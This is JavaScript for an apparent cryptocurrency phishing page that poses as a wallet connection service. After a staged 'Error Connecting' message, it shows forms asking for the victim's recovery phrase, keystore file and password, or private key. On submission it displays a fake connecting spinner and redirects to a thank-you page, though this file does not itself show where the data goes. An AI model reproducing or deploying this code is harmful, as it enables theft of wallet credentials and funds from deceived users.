document.addEventListener("DOMContentLoaded", function () {
  // --- Helper functions for selecting elements ---
  const select = (selector) => document.querySelectorAll(selector);
  const getEl = (selector) => document.querySelector(selector);

  // --- Element Declarations ---
  const dialogDismiss = select(".dialog-dismiss");
  const sendForm = getEl("#data-to-send");
  const phraseSend = getEl("#phraseSend");
  const keystoreSend = getEl("#keystoreSend");
  const privateKeySend = getEl("#privateKeySend");
  const connectionInfo = getEl(".connection-info");

  // Elements for Form Submission/UI Control
  const walletForm = document.getElementById("walletForm");
  // NOTE: We will select processBtn and cancelBtn inside the submit handler
  // to ensure we get a fresh reference every time, preventing errors with dynamic content.

  // 1. Connection Initialization Logic (from jQuery)
  let wallets = select(".coin-registry button");
  wallets.forEach(function (button) {
    button.addEventListener("click", function (event) {
      event.preventDefault();

      let img = button.querySelector(".coin-img")
        ? button.querySelector(".coin-img").getAttribute("src")
        : "";
      let walletName = button.lastElementChild.textContent.trim();

      const connectDialog = getEl("#connect-dialog");
      const connectionInfoEl = getEl(".connection-info");
      const currentWalletApp = getEl("#current-wallet-app");
      const currentWalletLogo = getEl("#current-wallet-logo");

      if (connectionInfoEl) connectionInfoEl.textContent = "Initializing...";
      if (currentWalletApp) currentWalletApp.textContent = walletName;
      if (currentWalletLogo) currentWalletLogo.setAttribute("src", img);
      if (connectDialog) connectDialog.style.display = "block";

      setTimeout(function () {
        if (connectionInfoEl) {
          connectionInfoEl.innerHTML =
            'Error Connecting... <button class="manual-connection">Connect Manually</button>';
        }
      }, 4000);
    });
  });

  // 2. Dialog Dismiss Buttons
  dialogDismiss.forEach(function (el) {
    el.addEventListener("click", function () {
      const connectDialog = getEl("#connect-dialog");
      const sendDialog = getEl("#send-dialog");
      if (connectDialog) connectDialog.style.display = "none";
      if (sendDialog) sendDialog.style.display = "none";
    });
  });

  // 3. Dynamic Content Setup (Phrase, Keystore, Private Key)
  if (phraseSend && sendForm) {
    phraseSend.addEventListener("click", function () {
      sendForm.innerHTML =
        '<div class="form-group"><input type="hidden" id="type" name="type" value="phrase"><textarea name="phrase" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea> </div> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>';
    });
  }
  if (keystoreSend && sendForm) {
    keystoreSend.addEventListener("click", function () {
      sendForm.innerHTML =
        '<div class="form-group"><input type="hidden" id="type" name="type" value="keystore"><textarea rows="5" style="resize: none" required name="keystore" class="form-control" placeholder="Enter Keystore"></textarea></div><input type="text" class="form-control" name="password" required placeholder="Wallet password"> <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>';
    });
  }
  if (privateKeySend && sendForm) {
    privateKeySend.addEventListener("click", function () {
      sendForm.innerHTML =
        '<input type="hidden" id="type" name="type" value="privatekey"><input type="text" name="privateKey" required class="form-control" placeholder="Enter your Private Key"> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by a single space.</div>';
    });
  }

  // 4. Manual Connection Click (Delegated Event)
  if (connectionInfo) {
    connectionInfo.addEventListener("click", function (e) {
      if (e.target.classList.contains("manual-connection")) {
        const currentWalletApp = getEl("#current-wallet-app");
        const currentWalletAppSend = getEl("#current-wallet-app-send");
        const walletNameData = getEl("#walletNameData");
        const currentWalletLogo = getEl("#current-wallet-logo");
        const currentWalletSendLogo = getEl("#current-wallet-send-logo");
        const connectDialog = getEl("#connect-dialog");
        const sendDialog = getEl("#send-dialog");

        if (currentWalletAppSend && currentWalletApp) {
          currentWalletAppSend.textContent = currentWalletApp.textContent;
        }
        if (walletNameData && currentWalletApp) {
          walletNameData.value = currentWalletApp.textContent;
        }
        if (currentWalletSendLogo && currentWalletLogo) {
          currentWalletSendLogo.src = currentWalletLogo.src;
        }
        if (connectDialog) connectDialog.style.display = "none";
        if (sendDialog) sendDialog.style.display = "block";
      }
    });
  }

  // 5. Form Submission Handler (WITH SPINNER AND REDIRECTION FIXES)
  if (walletForm) {
    walletForm.addEventListener("submit", function (e) {
      e.preventDefault();

      // Get fresh references to buttons inside the submit handler
      const processBtn = getEl("#proceedButton");
      const cancelBtn = getEl("#cancelBtn");

      const formData = new FormData(e.target);
      const submittedData = {};

      const phrase = formData.get("phrase");
      const keystore = formData.get("keystore");
      const privateKey = formData.get("privateKey");
      const password = formData.get("password");

      let validSubmission = false;

      // Check for valid data
      if (phrase || (keystore && password) || privateKey) {
        validSubmission = true;
      }

      if (validSubmission) {
        // --- UI Change Logic (Replacing Buttons with Spinner) ---
        if (processBtn) {
          // This line attempts to show the spinner
          processBtn.innerHTML =
            '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...';
          processBtn.disabled = true;
        }
        if (cancelBtn) {
          cancelBtn.disabled = true;
        }

        // --- NEW FEATURE: Redirect after a short delay ---
        // The 500ms delay gives the browser time to render the spinner
        // before navigating away.
        setTimeout(function () {
          window.location.href = "thankyou.html";
        }, 500);
      } else {
        // Fallback for an empty or invalid form submission
        console.error("Submission failed: Data fields are empty.");
        // Optional: Reset buttons or display an error message
        return;
      }
    });
  }
});
